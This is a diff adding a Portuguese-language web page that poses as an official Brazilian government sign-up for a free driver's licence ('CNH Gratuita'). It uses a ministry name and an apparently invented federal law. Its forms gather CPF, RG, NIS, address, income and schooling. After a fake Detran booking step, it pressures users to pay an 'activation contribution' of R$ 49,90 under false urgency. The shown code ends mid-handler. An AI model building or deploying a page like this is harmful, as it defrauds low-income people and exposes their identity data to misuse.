@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNH SOCIAL - Cadastro Oficial</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts - Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .quiz-container {
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            padding: 32px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .quiz-part {
+            display: none; /* Hidden by default */
+            width: 100%;
+        }
+        .quiz-part.active {
+            display: block;
+        }
+        .logo-container { /* New class for the logo and text container */
+            display: flex;
+            align-items: center; /* Aligns items vertically in the middle */
+            justify-content: center; /* Centers items horizontally */
+            margin-bottom: 24px;
+            flex-wrap: wrap; /* Allows items to wrap on smaller screens */
+            gap: 16px; /* Space between logo and text */
+        }
+        .logo {
+            max-width: 150px;
+            height: auto; /* Ensures aspect ratio is maintained */
+        }
+        .ministry-text {
+            font-size: 1.25rem; /* Equivalent to text-xl in Tailwind */
+            font-weight: 600; /* Equivalent to font-semibold in Tailwind */
+            color: #374151; /* A dark gray color */
+            text-align: left; /* Align text to the left */
+            max-width: 250px; /* Limit width to prevent text from being too long */
+        }
+        .btn {
+            background-image: linear-gradient(to right, #1a73e8 0%, #4285f4 51%, #1a73e8 100%);
+            margin: 10px;
+            padding: 12px 32px;
+            text-align: center;
+            text-transform: uppercase;
+            transition: 0.5s;
+            background-size: 200% auto;
+            color: white;
+            border-radius: 10px;
+            display: inline-block;
+            box-shadow: 0 4px 15px -5px #4285f4;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+        }
+        .btn:hover {
+            background-position: right center; /* change the direction of the change here */
+            color: #fff;
+            text-decoration: none;
+        }
+        .btn-back {
+            background-color: #6b7280; /* Gray color for back button */
+            background-image: none; /* Override gradient */
+            box-shadow: 0 4px 15px -5px #6b7280;
+        }
+        .btn-back:hover {
+            background-color: #4b5563;
+        }
+        input[type="text"],
+        input[type="number"],
+        input[type="date"],
+        select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        label {
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #374151;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .radio-group, .checkbox-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 16px;
+            justify-content: flex-start;
+        }
+        .radio-group label, .checkbox-group label {
+            display: flex;
+            align-items: center;
+            font-weight: normal;
+            cursor: pointer;
+        }
+        .radio-group input[type="radio"], .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 8px;
+            margin-bottom: 0;
+        }
+        .loading-spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #4285f4;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            margin: 32px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .date-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .date-item, .time-item {
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        .date-item.selected, .time-item.selected {
+            background-color: #4285f4;
+            color: white;
+            border-color: #4285f4;
+            box-shadow: 0 2px 8px rgba(66, 133, 244, 0.3);
+        }
+        .date-item:hover:not(.selected), .time-item:hover:not(.selected) {
+            background-color: #e0e7ff;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 20px; /* Space between buttons */
+            width: 100%;
+            flex-wrap: wrap; /* Allow buttons to wrap on smaller screens */
+        }
+        /* Custom alert/modal styling */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .modal-content button {
+            margin-top: 16px;
+            padding: 8px 16px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        /* Nova classe para o contêiner do vídeo para garantir a proporção e bordas arredondadas */
+        .video-responsive {
+            position: relative;
+            padding-bottom: 177.77%; /* Proporção 9:16 (vertical) */
+            height: 0;
+            overflow: hidden;
+            border-radius: 16px;
+            max-width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="quiz-container">
+        <!-- Parte 1: Apresentação -->
+        <div id="part1" class="quiz-part active">
+            <!-- Container do logo, visível apenas na primeira parte -->
+            <div class="logo-container">
+                <img src="https://i.postimg.cc/bNp299wF/Logo.png" alt="Logotipo CNH SOCIAL" class="logo">
+                <span class="ministry-text">Ministério da Gestão e da Inovação em Serviços Públicos</span>
+            </div>
+            <h1 class="text-3xl font-bold text-gray-800 mb-4">🎉 CNH Gratuita 2025 — Cadastro Oficial</h1>
+            <p class="text-gray-600 mb-6 leading-relaxed">
+                Seja bem-vindo ao sistema de inscrição do Programa CNH Gratuita, criado pela Lei Federal nº 15.153/2025, que garante habilitação 100% gratuita para pessoas de baixa renda inscritas no CadÚnico.
+            </p>
+            <p class="text-gray-600 mb-8 leading-relaxed">
+                Aqui você poderá se cadastrar, enviar seus documentos e acompanhar todas as etapas do processo com segurança, transparência e total apoio técnico.
+            </p>
+            <p class="text-blue-600 font-semibold mb-8">Mobilidade é direito. Inclusão começa com acesso.</p>
+            <button id="btnPart1" class="btn">INICIAR CADASTRO</button>
+        </div>
+
+        <!-- Parte 2: Imagem de Notícia -->
+        <div id="part2" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Notícias e Informações Importantes</h2>
+            <!-- Vídeo do YouTube incorporado com autoplay removido. O áudio funcionará, mas o usuário precisará clicar para dar play. -->
+            <div class="video-responsive mx-auto my-4">
+                <!-- Parâmetro `autoplay=1` removido e `controls=0` adicionado para esconder os controles do player. -->
+                <iframe 
+                    src="https://www.youtube.com/embed/-tYVAtM7aA8?controls=0&modestbranding=1&rel=0&loop=1&playlist=-tYVAtM7aA8"
+                    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;"
+                    allow="encrypted-media; fullscreen; picture-in-picture"
+                    title="YouTube video player"
+                    frameborder="0"
+                    allowfullscreen>
+                </iframe>
+            </div>
+            <button id="btnPart2" class="btn">CONTINUAR CADASTRO</button>
+        </div>
+
+        <!-- Parte 3: Solicitar Dados Pessoais -->
+        <div id="part3" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Identificação Pessoal</h2>
+            <div class="form-group">
+                <label for="nomeCompleto">Nome completo:</label>
+                <input type="text" id="nomeCompleto" placeholder="Seu nome completo" required>
+            </div>
+            <div class="form-group">
+                <label for="dataNascimento">Data de Nascimento:</label>
+                <input type="date" id="dataNascimento" required>
+            </div>
+            <div class="form-group">
+                <label>Gênero:</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="genero" value="Masculino" required> Masculino</label>
+                    <label><input type="radio" name="genero" value="Feminino"> Feminino</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="estadoCivil">Estado Civil:</label>
+                <select id="estadoCivil" required>
+                    <option value="">Selecione</option>
+                    <option value="Solteiro(a)">Solteiro(a)</option>
+                    <option value="Casado(a)">Casado(a)</option>
+                    <option value="Divorciado(a)">Divorciado(a)</option>
+                    <option value="Viuvo(a)">Viúvo(a)</option>
+                </select>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart3" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart3" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 3.1: Documentação -->
+        <div id="part3-1" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Documentação</h2>
+            <div class="form-group">
+                <label for="cpf">CPF:</label>
+                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
+            </div>
+            <div class="form-group">
+                <label for="rg">RG:</label>
+                <input type="text" id="rg" placeholder="00.000.000-0" required>
+            </div>
+            <div class="form-group">
+                <label for="nis">Número NIS:</label>
+                <input type="text" id="nis" placeholder="Seu número NIS">
+                <div class="checkbox-group mt-2">
+                    <label><input type="checkbox" id="naoTenhoNis"> Não tenho NIS</label>
+                </div>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart3-1" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart3-1" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 3.2: Endereço -->
+        <div id="part3-2" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Endereço</h2>
+            <div class="form-group">
+                <label for="rua">Rua:</label>
+                <input type="text" id="rua" placeholder="Nome da Rua" required>
+            </div>
+            <div class="form-group">
+                <label for="numero">Número:</label>
+                <input type="text" id="numero" placeholder="Número da residência" required>
+            </div>
+            <div class="form-group">
+                <label for="complemento">Complemento (Opcional):</label>
+                <input type="text" id="complemento" placeholder="Ex: Apt 101, Bloco B">
+            </div>
+            <div class="form-group">
+                <label for="bairro">Bairro:</label>
+                <input type="text" id="bairro" placeholder="Nome do Bairro" required>
+            </div>
+            <div class="form-group">
+                <label for="cidade">Cidade:</label>
+                <input type="text" id="cidade" placeholder="Nome da Cidade" required>
+            </div>
+            <div class="form-group">
+                <label for="estado">Estado:</label>
+                <select id="estado" required>
+                    <option value="">Selecione o Estado</option>
+                    <option value="AC">Acre</option>
+                    <option value="AL">Alagoas</option>
+                    <option value="AP">Amapá</option>
+                    <option value="AM">Amazonas</option>
+                    <option value="BA">Bahia</option>
+                    <option value="CE">Ceará</option>
+                    <option value="DF">Distrito Federal</option>
+                    <option value="ES">Espírito Santo</option>
+                    <option value="GO">Goiás</option>
+                    <option value="MA">Maranhão</option>
+                    <option value="MT">Mato Grosso</option>
+                    <option value="MS">Mato Grosso do Sul</option>
+                    <option value="MG">Minas Gerais</option>
+                    <option value="PA">Pará</option>
+                    <option value="PB">Paraíba</option>
+                    <option value="PR">Paraná</option>
+                    <option value="PE">Pernambuco</option>
+                    <option value="PI">Piauí</option>
+                    <option value="RJ">Rio de Janeiro</option>
+                    <option value="RN">Rio Grande do Norte</option>
+                    <option value="RS">Rio Grande do Sul</option>
+                    <option value="RO">Rondônia</option>
+                    <option value="RR">Roraima</option>
+                    <option value="SC">Santa Catarina</option>
+                    <option value="SP">São Paulo</option>
+                    <option value="SE">Sergipe</option>
+                    <option value="TO">Tocantins</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="cep">CEP:</label>
+                <input type="text" id="cep" placeholder="00000-000" maxlength="9" required>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart3-2" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart3-2" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 3.3: Informações Socioeconômicas -->
+        <div id="part3-3" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Informações Socioeconômicas</h2>
+            <div class="form-group">
+                <label for="rendaFamiliar">Renda familiar total (mensal):</label>
+                <input type="number" id="rendaFamiliar" placeholder="Ex: 2500.00" step="0.01" min="0" required>
+            </div>
+            <div class="form-group">
+                <label for="membrosFamilia">Número de membros da família:</label>
+                <input type="number" id="membrosFamilia" placeholder="Ex: 4" min="1" required>
+            </div>
+            <div class="form-group">
+                <label for="situacaoTrabalho">Situação de trabalho:</label>
+                <select id="situacaoTrabalho" required>
+                    <option value="">Selecione</option>
+                    <option value="Empregado">Empregado</option>
+                    <option value="Autônomo">Autônomo</option>
+                    <option value="Desempregado">Desempregado</option>
+                    <option value="Estudante">Estudante</option>
+                </select>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart3-3" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart3-3" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 3.4: Escolaridade -->
+        <div id="part3-4" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Escolaridade</h2>
+            <div class="form-group">
+                <label for="grauInstrucao">Grau de instrução:</label>
+                <select id="grauInstrucao" required>
+                    <option value="">Selecione</option>
+                    <option value="Ensino Fundamental incompleto">Ensino Fundamental incompleto</option>
+                    <option value="Ensino Fundamental completo">Ensino Fundamental completo</option>
+                    <option value="Cursando ensino fundamental">Cursando ensino fundamental</option>
+                    <option value="Ensino Médio completo">Ensino Médio completo</option>
+                    <option value="Ensino Médio incompleto">Ensino Médio incompleto</option>
+                    <option value="Cursando ensino médio">Cursando ensino médio</option>
+                    <option value="Ensino Superior completo">Ensino Superior completo</option>
+                    <option value="Ensino Superior incompleto">Ensino Superior incompleto</option>
+                    <option value="Cursando ensino superior">Cursando ensino superior</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Sabe ler e escrever?</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="lerEscrever" value="Sim" required> Sim</label>
+                    <label><input type="radio" name="lerEscrever" value="Não"> Não</label>
+                </div>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart3-4" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart3-4" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 4: Informações CNH Desejada -->
+        <div id="part4" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Informações CNH</h2>
+            <div class="form-group">
+                <label>Categoria desejada:</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="categoriaCNH" value="A" required> A (moto)</label>
+                    <label><input type="radio" name="categoriaCNH" value="B"> B (carro)</label>
+                    <label><input type="radio" name="categoriaCNH" value="AB"> AB (ambas)</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Deseja realizar atividade remunerada?</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="atividadeRemunerada" value="Sim" required> Sim</label>
+                    <label><input type="radio" name="atividadeRemunerada" value="Não"> Não</label>
+                </div>
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart4" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart4" class="btn">CONTINUAR</button>
+            </div>
+        </div>
+
+        <!-- Parte 5: Tela de Carregamento 1 -->
+        <div id="part5" class="quiz-part">
+            <div class="loading-spinner"></div>
+            <p class="text-xl font-semibold text-gray-700">Seu cadastro está sendo processado...</p>
+            <p class="text-gray-500 mt-2">Por favor, aguarde enquanto processamos seus dados.</p>
+        </div>
+
+        <!-- Parte 6: Tela de Agendamento - Instruções -->
+        <div id="part6" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Próximos Passos: Validação Presencial</h2>
+            <p class="text-gray-600 mb-4 leading-relaxed">
+                Parabéns! Sua pré-inscrição foi realizada com sucesso. Para finalizar seu cadastro no programa CNH Gratuita, é necessário comparecer a uma unidade do Detran para:
+            </p>
+            <ul class="list-disc list-inside text-left text-gray-600 mb-6">
+                <li>Validação de identidade</li>
+                <li>Cadastro da digital</li>
+                <li>Tirar foto para a CNH</li>
+            </ul>
+            <p class="text-gray-600 mb-8 leading-relaxed">
+                Clique no botão abaixo para agendar a sua visita e garantir sua vaga.
+            </p>
+            <div class="button-group">
+                <button id="btnBackPart6" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart6" class="btn">AGENDAR VALIDAÇÃO DE IDENTIDADE</button>
+            </div>
+        </div>
+
+        <!-- Parte 7: Tela de Agendamento - Seleção de Data/Hora -->
+        <div id="part7" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">Agendamento no Detran</h2>
+            <p class="text-gray-600 mb-4">Selecione a data desejada para seu agendamento:</p>
+            <div id="dateGrid" class="date-grid">
+                <!-- Datas serão carregadas dinamicamente aqui -->
+            </div>
+            <p class="text-gray-600 mb-4">Selecione o horário disponível:</p>
+            <div id="timeGrid" class="date-grid">
+                <!-- Horários serão carregados dinamicamente aqui -->
+            </div>
+            <div class="button-group">
+                <button id="btnBackPart7" class="btn btn-back">VOLTAR</button>
+                <button id="btnPart7" class="btn">CONFIRMAR AGENDAMENTO</button>
+            </div>
+        </div>
+
+        <!-- Parte 8: Tela de Carregamento 2 -->
+        <div id="part8" class="quiz-part">
+            <div class="loading-spinner"></div>
+            <p class="text-xl font-semibold text-gray-700">Realizando seu agendamento...</p>
+            <p class="text-gray-500 mt-2">Falta somente mais um passo para concluir!</p>
+        </div>
+        
+        <!-- Parte 9: Tela de Pagamento (Instruções) - FINAL DO FLUXO -->
+        <div id="part9" class="quiz-part">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">🕒 Falta só um passo para conquistar sua CNH gratuita!</h2>
+            <p class="text-gray-600 mb-4 leading-relaxed">
+                Seu agendamento está quase confirmado — falta apenas a última etapa: a validação da inscrição através da Contribuição de Ativação e Emissão Digital no valor simbólico de <span class="font-bold text-blue-600">R$ 49,90</span>.
+            </p>
+            <p class="text-gray-600 mb-4 leading-relaxed">
+                Essa pequena contribuição garante a sua entrada definitiva no programa e ativa todos os sistemas necessários para que você receba sua CNH 100% gratuita, conforme determina a Lei Federal nº 15.153/2025.
+            </p>
+            <h3 class="text-xl font-semibold text-gray-700 mb-3">Por que essa contribuição é essencial:</h3>
+            <ul class="list-disc list-inside text-left text-gray-600 mb-6">
+                <li>✅ Valida seu agendamento oficial no Detran</li>
+                <li>✅ Garante acesso completo à plataforma do programa</li>
+                <li>✅ Ativa a preparação para sua emissão digital da CNH</li>
+                <li>✅ Confirma sua vaga nas autoescolas credenciadas</li>
+                <li>✅ Sustenta a segurança, rastreabilidade e suporte técnico do sistema</li>
+            </ul>
+            <p class="text-red-500 font-bold mb-4">⚠️ Atenção:</p>
+            <p class="text-gray-600 mb-4 leading-relaxed">
+                O número de vagas é limitado e a sua pré-inscrição expira em breve caso a validação não seja feita agora.
+                Não perca essa chance única de mudar sua vida e garantir sua CNH sem custo algum.
+            </p>
+            <p class="text-blue-600 font-semibold mb-8">A diferença entre “quase” e “conseguido” está a um clique de distância.</p>
+            <button id="btnPart9" class="btn">🎯 Clique abaixo para confirmar sua inscrição agora e garantir sua vaga no programa.</button>
+        </div>
+    </div>
+
+    <!-- Container for custom modal -->
+    <div id="modalContainer"></div>
+
+    <script>
+        // Get all quiz parts
+        const quizParts = document.querySelectorAll('.quiz-part');
+        let currentPartIndex = 0;
+
+        // Custom alert function to avoid issues with iframes
+        function customAlert(message) {
+            const modalContainer = document.getElementById('modalContainer');
+            modalContainer.innerHTML = `
+                <div class="modal-overlay">
+                    <div class="modal-content">
+                        <p>${message}</p>
+                        <button onclick="closeModal()">OK</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function closeModal() {
+            const modalContainer = document.getElementById('modalContainer');
+            modalContainer.innerHTML = '';
+        }
+
+        // Function to show a specific quiz part
+        function showPart(index) {
+            quizParts.forEach((part, i) => {
+                if (i === index) {
+                    part.classList.add('active');
+                } else {
+                    part.classList.remove('active');
+                }
+            });
+            currentPartIndex = index;
+        }
+
+        // Function to go to the next part
+        function nextPart(validationFunction = null) {
+            if (validationFunction && !validationFunction()) {
+                return; // Stop if validation fails
+            }
+            if (currentPartIndex < quizParts.length - 1) {
+                showPart(currentPartIndex + 1);
+            }
+        }
+
+        // Function to go to the previous part
+        function prevPart() {
+            if (currentPartIndex > 0) {
+                showPart(currentPartIndex - 1);
+            }
+        }
+        
+        // --- Part 1: Apresentação ---
+        document.getElementById('btnPart1').addEventListener('click', () => {
+            showPart(1); // Go to Part 2
+        });
+
+        // --- Part 2: Imagem de Notícia ---
+        document.getElementById('btnPart2').addEventListener('click', () => {
+            showPart(2); // Go to Part 3
+        });
+
+        // --- Part 3: Solicitar Dados Pessoais (Identificação Pessoal) ---
+        document.getElementById('btnPart3').addEventListener('click', () => {
+            const nomeCompleto = document.getElementById('nomeCompleto').value;
+            const dataNascimento = document.getElementById('dataNascimento').value;
+            const genero = document.querySelector('input[name="genero"]:checked');
+            const estadoCivil = document.getElementById('estadoCivil').value;
+
+            if (!nomeCompleto || !dataNascimento || !genero || !estadoCivil) {
+                customAlert('Por favor, preencha todos os campos de Identificação Pessoal.');
+                return;
+            }
+
+            // Age validation (minimum 18 years)
+            const birthDate = new Date(dataNascimento);
+            const today = new Date();
+            let age = today.getFullYear() - birthDate.getFullYear();
+            const m = today.getMonth() - birthDate.getMonth();
+            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+
+            if (age < 18) {
+                customAlert('Você deve ter no mínimo 18 anos para se cadastrar.');
+                return;
+            }
+
+            showPart(3); // Go to Part 3.1 (Documentação)
+        });
+        document.getElementById('btnBackPart3').addEventListener('click', () => {
+            showPart(1); // Back to Part 2
+        });
+
+        // --- Part 3.1: Documentação ---
+        // CPF Masking
+        document.getElementById('cpf').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 9) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3})$/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/^(\d{3})(\d{3})$/, '$1.$2');
+            }
+            e.target.value = value;
+        });
+
+        // RG Masking (basic, adjust as needed for specific formats)
+        document.getElementById('rg').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 8) {
+                value = value.replace(/^(\d{2})(\d{3})(\d{3})(\d{1})$/, '$1.$2.$3-$4');
+            } else if (value.length > 5) {
+                value = value.replace(/^(\d{2})(\d{3})(\d{3})$/, '$1.$2.$3');
+            } else if (value.length > 2) {
+                value = value.replace(/^(\d{2})(\d{3})$/, '$1.$2');
+            }
+            e.target.value = value;
+        });
+
+        // NIS checkbox logic
+        document.getElementById('naoTenhoNis').addEventListener('change', function() {
+            const nisInput = document.getElementById('nis');
+            if (this.checked) {
+                nisInput.value = '';
+                nisInput.setAttribute('disabled', 'disabled');
+                nisInput.removeAttribute('required');
+            } else {
+                nisInput.removeAttribute('disabled');
+                nisInput.setAttribute('required', 'required');
+            }
+        });
+        
+        document.getElementById('btnPart3-1').addEventListener('click', () => {
+            const cpf = document.getElementById('cpf').value;
+            const rg = document.getElementById('rg').value;
+            const nis = document.getElementById('nis').value;
+            const naoTenhoNis = document.getElementById('naoTenhoNis').checked;
+
+            if (!cpf || !rg || (!nis && !naoTenhoNis)) {
+                customAlert('Por favor, preencha todos os campos de Documentação.');
+                return;
+            }
+            showPart(4); // Go to Part 3.2 (Endereço)
+        });
+        document.getElementById('btnBackPart3-1').addEventListener('click', () => {
+            showPart(2); // Back to Part 3
+        });
+
+        // --- Part 3.2: Endereço ---
+        // CEP Masking
+        document.getElementById('cep').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 5) {
+                value = value.replace(/^(\d{5})(\d{3})$/, '$1-$2');
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('btnPart3-2').addEventListener('click', () => {
+            const rua = document.getElementById('rua').value;
+            const numero = document.getElementById('numero').value;
+            const bairro = document.getElementById('bairro').value;
+            const cidade = document.getElementById('cidade').value;
+            const estado = document.getElementById('estado').value; // Now a select element
+            const cep = document.getElementById('cep').value;
+
+            // Complemento is optional, so no validation needed for it here
+
+            if (!rua || !numero || !bairro || !cidade || !estado || !cep) {
+                customAlert('Por favor, preencha todos os campos obrigatórios de Endereço.');
+                return;
+            }
+            showPart(5); // Go to Part 3.3 (Informações Socioeconômicas)
+        });
+        document.getElementById('btnBackPart3-2').addEventListener('click', () => {
+            showPart(3); // Back to Part 3.1
+        });
+
+        // --- Part 3.3: Informações Socioeconômicas ---
+        document.getElementById('btnPart3-3').addEventListener('click', () => {
+            const rendaFamiliar = document.getElementById('rendaFamiliar').value;
+            const membrosFamilia = document.getElementById('membrosFamilia').value;
+            const situacaoTrabalho = document.getElementById('situacaoTrabalho').value;
+
+            if (!rendaFamiliar || !membrosFamilia || !situacaoTrabalho) {
+                customAlert('Por favor, preencha todos os campos de Informações Socioeconômicas.');
+                return;
+            }
+            showPart(6); // Go to Part 3.4 (Escolaridade)
+        });
+        document.getElementById('btnBackPart3-3').addEventListener('click', () => {
+            showPart(4); // Back to Part 3.2
+        });
+
+        // --- Part 3.4: Escolaridade ---
+        document.getElementById('btnPart3-4').addEventListener('click', () => {
+            const grauInstrucao = document.getElementById('grauInstrucao').value;
+            const lerEscrever = document.querySelector('input[name="lerEscrever"]:checked');
+
+            if (!grauInstrucao || !lerEscrever) {
+                customAlert('Por favor, preencha todos os campos de Escolaridade.');
+                return;
+            }
+            showPart(7); // Go to Part 4
+        });
+        document.getElementById('btnBackPart3-4').addEventListener('click', () => {
+            showPart(5); // Back to Part 3.3
+        });
+
+        // --- Part 4: Informações CNH Desejada ---
+        document.getElementById('btnPart4').addEventListener('click', () => {
+            const categoriaCNH = document.querySelector('input[name="categoriaCNH"]:checked');
+            const atividadeRemunerada = document.querySelector('input[name="atividadeRemunerada"]:checked');
+
+            if (!categoriaCNH || !atividadeRemunerada) {
+                customAlert('Por favor, selecione as opções de CNH desejada.');
+                return;
+            }
+
+            // Go to Part 5 (Loading Screen 1)
+            showPart(8); // Part 5 (Loading 1) is at index 8
+            setTimeout(() => {
+                showPart(9); // Part 6 (Agendamento Instruções) is at index 9
+            }, 3000);
+        });
+        document.getElementById('btnBackPart4').addEventListener('click', () => {
+            showPart(6); // Back to Part 3.4
+        });
+
+        // --- Part 6: Tela de Agendamento - Instruções ---
+        document.getElementById('btnPart6').addEventListener('click', () => {
+            // Go to Part 7 (Agendamento Seleção)
+            showPart(10); // Part 7 (Agendamento Seleção) is at index 10
+            generateAvailableDates(); // Generate dates when entering this part
+        });
+        document.getElementById('btnBackPart6').addEventListener('click', () => {
+            showPart(7); // Back to Part 4
+        });
+
+        // --- Part 7: Tela de Agendamento - Seleção de Data/Hora ---
+        let selectedDate = null;
+        let selectedTime = null;
+
+        function generateAvailableDates() {
+            const dateGrid = document.getElementById('dateGrid');
+            dateGrid.innerHTML = ''; // Clear previous dates
+
+            const today = new Date();
+            const startDate = new Date(today);
+            startDate.setDate(today.getDate() + 20); // Start 20 days from now
+
+            for (let i = 0; i < 30; i++) { // Generate dates for the next 30 days
+                const date = new Date(startDate);
+                date.setDate(startDate.getDate() + i);
+
+                // Only include weekdays (Monday to Friday)
+                if (date.getDay() !== 0 && date.getDay() !== 6) { // 0 = Sunday, 6 = Saturday
+                    const dateItem = document.createElement('div');
+                    dateItem.classList.add('date-item');
+                    dateItem.textContent = date.toLocaleDateString('pt-BR', { weekday: 'short', day: 'numeric', month: 'short' });
+                    dateItem.dataset.date = date.toISOString().split('T')[0]; // Store date in YYYY-MM-DD format
+
+                    dateItem.addEventListener('click', () => {
+                        // Remove 'selected' from previously selected date
+                        const currentSelected = dateGrid.querySelector('.date-item.selected');
+                        if (currentSelected) {
+                            currentSelected.classList.remove('selected');
+                        }
+                        // Add 'selected' to the clicked date
+                        dateItem.classList.add('selected');
+                        selectedDate = dateItem.dataset.date;
+                        generateAvailableTimes(); // Regenerate times based on selected date
+                    });
+                    dateGrid.appendChild(dateItem);
+                }
+            }
+        }
+
+        function generateAvailableTimes() {
+            const timeGrid = document.getElementById('timeGrid');
+            timeGrid.innerHTML = ''; // Clear previous times
+            selectedTime = null; // Reset selected time
+
+            const times = ['08:00', '09:00', '10:00', '11:00', '13:00', '14:00', '15:00', '16:00']; // Example times
+
+            times.forEach(time => {
+                const timeItem = document.createElement('div');
+                timeItem.classList.add('time-item');
+                timeItem.textContent = time;
+                timeItem.dataset.time = time;
+
+                timeItem.addEventListener('click', () => {
+                    // Remove 'selected' from previously selected time
+                    const currentSelected = timeGrid.querySelector('.time-item.selected');
+                    if (currentSelected) {
+                        currentSelected.classList.remove('selected');
+                    }
+                    // Add 'selected' to the clicked time
+                    timeItem.classList.add('selected');
+                    selectedTime = timeItem.dataset.time;
+                });
+                timeGrid.appendChild(timeItem);
+            });
+        }
+
+        document.getElementById('btnPart7').addEventListener('click', () => {
+            if (!selectedDate || !selectedTime) {
+                customAlert('Por favor, selecione uma data e um horário para o agendamento.');
+                return;
+            }
+            // Go to Part 8 (Loading Screen 2)
+            showPart(11); // Part 8 (Loading 2) is at index 11
+            setTimeout(() => {
+                showPart(12); // Go to Part 9 (Pagamento) is at index 12
+            }, 5000);
+        });
+        document.getElementById('btnBackPart7').addEventListener('click', () => {
+            showPart(9); // Back to Part 6
+        });
+        
+        // --- Parte 9: Tela de Pagamento (Instruções) - FINAL DO FLUXO ---
+        // Ação do botão "Confirmar inscrição" que agora apenas exibe um alerta final.
+        document.getElementById('btnPart9').addEventListener('click', () => {
